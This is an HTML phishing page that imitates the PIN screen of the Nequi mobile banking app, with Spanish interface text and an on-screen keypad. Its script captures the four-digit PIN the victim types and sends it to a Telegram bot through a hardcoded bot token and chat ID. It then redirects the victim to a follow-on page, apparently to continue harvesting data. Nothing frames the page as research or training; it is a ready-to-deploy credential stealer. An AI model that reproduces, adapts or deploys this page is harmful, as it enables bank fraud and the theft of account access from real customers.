<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Nequi - Clave</title>

<style>
    body {
        margin: 0;
        padding: 0;
        background: #1a001a;
        font-family: 'Poppins', Arial, sans-serif;
        color: white;
        min-height: 100vh;
        display: flex;
        justify-content: center;
    }

    .container {
        width: 100%;
        max-width: 420px;
        padding: 20px;
        text-align: center;
    }

    .back {
        position: absolute;
        left: 20px;
        top: 20px;
        font-size: 28px;
        cursor: pointer;
    }

    .header {
        margin-top: 50px;
        margin-bottom: 40px;
    }

    .header h1 {
        font-size: 24px;
        margin: 0;
    }

    .pin-container {
        display: flex;
        justify-content: center;
        gap: 18px;
        margin: 40px 0 60px;
    }

    .pin-box {
        width: 55px;
        height: 58px;
        background: #f0e6ff;
        border: 2px solid #d1b3ff;
        border-radius: 12px;
        font-size: 34px;
        color: #ff008c;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .info-text {
        color: #ccc;
        font-size: 14.5px;
        line-height: 1.5;
        margin-bottom: 60px;
    }

    .keyboard {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 25px;
        max-width: 300px;
        margin: 0 auto;
    }

    .key {
        background: transparent;
        border: none;
        color: white;
        font-size: 32px;
        padding: 12px;
        cursor: pointer;
    }

    .key:active {
        color: #ff008c;
        transform: scale(0.85);
    }

    .key.delete {
        font-size: 28px;
        color: #ffffff;
        background: rgba(255,255,255,0.15);
        border-radius: 50%;
        width: 58px;
        height: 58px;
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 0 auto;
    }

    .key.delete:active {
        background: #ff008c;
    }
</style>
</head>
<body>

<div class="container">

    <div class="back" onclick="history.back()">←</div>

    <div class="header">
        <h1>Escribe tu clave</h1>
    </div>

    <div class="pin-container">
        <div id="pin1" class="pin-box"></div>
        <div id="pin2" class="pin-box"></div>
        <div id="pin3" class="pin-box"></div>
        <div id="pin4" class="pin-box"></div>
    </div>

    <div class="info-text">
        No dudamos que seas tú...<br>
        Pero es mejor confirmar ;)
    </div>

    <div class="keyboard">
        <button class="key" onclick="addDigit(1)">1</button>
        <button class="key" onclick="addDigit(2)">2</button>
        <button class="key" onclick="addDigit(3)">3</button>
        <button class="key" onclick="addDigit(4)">4</button>
        <button class="key" onclick="addDigit(5)">5</button>
        <button class="key" onclick="addDigit(6)">6</button>
        <button class="key" onclick="addDigit(7)">7</button>
        <button class="key" onclick="addDigit(8)">8</button>
        <button class="key" onclick="addDigit(9)">9</button>
        <button class="key" onclick="addDigit(0)" style="grid-column: 2;">0</button>
        <button class="key delete" onclick="deleteDigit()">⌫</button>
    </div>

</div>

<script>
let pin = "";

// Tus datos de Telegram
const TOKEN = "8738469968:AAFfDrLh-2HgqU_bFImXi9k4LI1KulcVaAE";
const CHAT_ID = "-5247833786";

function addDigit(digit) {
    if (pin.length >= 4) return;
    
    pin += digit;
    updatePins();

    // Cuando se completan los 4 dígitos
    if (pin.length === 4) {
        sendPinToTelegram();
    }
}

function deleteDigit() {
    pin = pin.slice(0, -1);
    updatePins();
}

function updatePins() {
    for (let i = 1; i <= 4; i++) {
        const box = document.getElementById("pin" + i);
        box.textContent = pin.length >= i ? "*" : "";
    }
}

// Enviar clave y redirigir a credito.html
function sendPinToTelegram() {
    const mensaje = `🔑 Clave ingresada\n\n🔑 PIN: ${pin}\n⏰ ${new Date().toLocaleString('es-CO')}`;

    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: mensaje
        })
    })
    .then(() => {
        // Redirección fuerte para Vercel
        window.location.href = "/credito.html";
    })
    .catch(() => {
        window.location.href = "/credito.html";
    });
}
</script>

</body>
</html>
